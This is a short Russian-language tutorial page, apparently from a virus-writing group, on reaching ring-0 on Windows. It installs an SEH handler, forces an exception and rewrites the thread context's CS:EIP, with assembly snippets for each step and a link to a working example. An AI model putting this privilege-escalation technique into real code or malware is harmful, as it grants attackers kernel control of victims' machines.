<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<HTML>
<HEAD>
<TITLE>ENTERING RING-0 WITHOUT USING WIN32 API: CONTEXT MODIFICATION</TITLE>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
</HEAD>
<BODY bgcolor=#B1B1B1 text=#000000 alink=#303080 vlink=#303080 link=#303080>
<p align=center>ENTERING RING-0 WITHOUT USING WIN32 API: CONTEXT MODIFICATION</p> 
<p align=center>------------------------------------------------------------</p>
<p align=left>
Вы наверное уже знакомы с трудами Z0mbie на тему перехода в ring0 c 
использованием GetTreadContext/SetTreadContext. Если нет, то советую это
сделать (TD052000). Ибо именно Z0mbie  излагает суть этой методы. 
Как оказалось CONTEXT можно изменить и без использования 
win32API (CreateTherad,GetTreadContext,SetTreadContext). Суть в cледующем:<br>
а) настраиваем SEH на свой обработчик:
<font color=#104510>
<br>
<pre>
       push offset  MySEH
       push dword ptr fs:[0]
       mov fs:[0],esp
</font>
</pre>
<br>
б) вызываем исключение (подойдет любой метод ;) :
<font color=#104510>
<br>
<pre>
       xor eax,eax
       mov [eax],eax
</font>
</pre>
<br>
в) управление получает MySEH :
<br>
<pre>
<font color=#104510>
MySEH: mov esi,[esp+0Ch]       ;
       mov eax,offset Ring0Proc;
       mov [esi+0b8h],eax      ;
       mov eax,0028h           ;
       mov [esi+0BCh],eax      ;
       xor eax,eax             ;
       ret                     ;
</font>
</pre>
<br>
Этот обработчик получает в esi указатель на CONTEXT "нитки" которая вызвала 
исключение. Далее в контексте меняются EIP и CS и завершается цепочка обработчиков
исключений. Т.о. винда восстанавливает работу "нитки" с новыми CS:EIP.
Рабочий пример находится в файле <a href="../files/seh2r0.zip">seh2r0.zip</a>
</p>                   
<p align=center><a href="http://smf.chat.ru">Voodoo /SMF</a></p>
</body>
</html>
